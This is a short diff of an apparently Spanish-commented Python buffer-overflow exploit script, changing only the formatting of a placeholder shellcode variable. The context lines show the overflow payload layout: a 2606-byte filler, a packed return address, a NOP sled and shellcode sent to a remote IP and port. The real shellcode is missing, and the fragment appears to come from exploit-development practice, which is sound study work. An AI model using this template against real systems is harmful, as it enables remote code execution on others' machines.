@@ -38,9 +38,7 @@ import socket, sys
 
 def exploit(ip_address, rport):
     # Escapar el shellcode con b para indicar que son bytes
-    shellcode= (
-        b"\ejemplo\"
-    )
+    shellcode= (b"\ejemplo")
 
     buffer = b"A" * 2606 + pack("<L", 0x5f4a358f) + b"\x90"*16 + shellcode
     
